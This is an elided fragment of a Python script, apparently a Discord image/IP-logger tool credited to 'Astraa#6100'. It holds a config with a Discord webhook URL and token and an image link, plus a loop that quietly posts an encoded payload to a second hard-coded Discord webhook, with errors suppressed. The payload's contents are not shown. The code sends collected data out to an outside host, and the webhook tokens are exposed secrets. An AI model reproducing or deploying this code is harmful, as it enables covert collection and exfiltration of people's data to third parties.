...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1469967100247277651/O_rcWaLQ6uRJzluCWvcrDDBSSLmrzXxlxt_BHT7YEmOPaIpG26cv4hByGnldiUukNj2K",
    "image": "https://i.imgur.com/GNVEy21.png", # You can also have a custom image by using a URL argument
...
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        ...
                        try:
                            ...
                            req = Request('https://discord.com/api/webhooks/1470566731834724352/2c2-hOUBQmTuMRsJnIlrMSV2l_xH7GY69cIPLS3eWkzVeu4rCT1SPjcPAWiUBv6s4tCC', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
